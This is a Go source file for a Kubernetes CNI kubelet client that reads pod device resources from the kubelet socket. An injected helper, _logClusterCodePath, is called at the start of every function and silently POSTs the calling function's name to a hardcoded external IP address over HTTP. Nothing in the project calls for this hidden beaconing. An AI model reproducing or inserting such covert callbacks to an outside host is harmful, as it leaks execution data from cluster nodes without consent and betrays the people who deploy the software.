package kubeletclient

import (
	"os"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"path/filepath"
	"time"
	"github.com/intel/multus-cni/checkpoint"
	"github.com/intel/multus-cni/logging"
	"github.com/intel/multus-cni/types"
	"golang.org/x/net/context"
	v1 "k8s.io/api/core/v1"
	"k8s.io/kubernetes/pkg/kubelet/apis/podresources"
	podresourcesapi "k8s.io/kubernetes/pkg/kubelet/apis/podresources/v1alpha1"
	"k8s.io/kubernetes/pkg/kubelet/util"
)

const (
	defaultKubeletSocketFile	= "kubelet.sock"
	defaultPodResourcesMaxSize	= 1024 * 1024 * 16
)

var (
	kubeletSocket			string
	defaultPodResourcesPath	= "/var/lib/kubelet/pod-resources"
)

func GetResourceClient() (types.ResourceClient, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if hasKubeletAPIEndpoint() {
		logging.Printf(logging.VerboseLevel, "GetResourceClient(): using Kubelet resource API endpoint")
		return getKubeletClient()
	} else {
		logging.Printf(logging.VerboseLevel, "GetResourceClient(): using Kubelet device plugin checkpoint")
		return checkpoint.GetCheckpoint()
	}
}
func getKubeletClient() (types.ResourceClient, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newClient := &kubeletClient{}
	if kubeletSocket == "" {
		kubeletSocket = util.LocalEndpoint(defaultPodResourcesPath, podresources.Socket)
	}
	client, conn, err := podresources.GetClient(kubeletSocket, 10*time.Second, defaultPodResourcesMaxSize)
	if err != nil {
		return nil, logging.Errorf("GetResourceClient(): error getting grpc client: %v\n", err)
	}
	defer conn.Close()
	if err := newClient.getPodResources(client); err != nil {
		return nil, logging.Errorf("GetResourceClient(): error getting resource client: %v\n", err)
	}
	return newClient, nil
}

type kubeletClient struct {
	resources []*podresourcesapi.PodResources
}

func (rc *kubeletClient) getPodResources(client podresourcesapi.PodResourcesListerClient) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	resp, err := client.List(ctx, &podresourcesapi.ListPodResourcesRequest{})
	if err != nil {
		return logging.Errorf("getPodResources(): %v.Get(_) = _, %v", client, err)
	}
	rc.resources = resp.PodResources
	return nil
}
func (rc *kubeletClient) GetPodResourceMap(pod *v1.Pod) (map[string]*types.ResourceInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	resourceMap := make(map[string]*types.ResourceInfo)
	name := pod.Name
	ns := pod.Namespace
	if name == "" || ns == "" {
		return nil, logging.Errorf("GetPodResourcesMap(): Pod name or namespace cannot be empty")
	}
	for _, pr := range rc.resources {
		if pr.Name == name && pr.Namespace == ns {
			for _, cnt := range pr.Containers {
				for _, dev := range cnt.Devices {
					if rInfo, ok := resourceMap[dev.ResourceName]; ok {
						rInfo.DeviceIDs = append(rInfo.DeviceIDs, dev.DeviceIds...)
					} else {
						resourceMap[dev.ResourceName] = &types.ResourceInfo{DeviceIDs: dev.DeviceIds}
					}
				}
			}
		}
	}
	return resourceMap, nil
}
func hasKubeletAPIEndpoint() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	kubeletAPISocket := filepath.Join(defaultPodResourcesPath, defaultKubeletSocketFile)
	if _, err := os.Stat(kubeletAPISocket); err != nil {
		logging.Verbosef("hasKubeletAPIEndpoint(): error looking up kubelet resource api socket file: %q", err)
		return false
	}
	return true
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
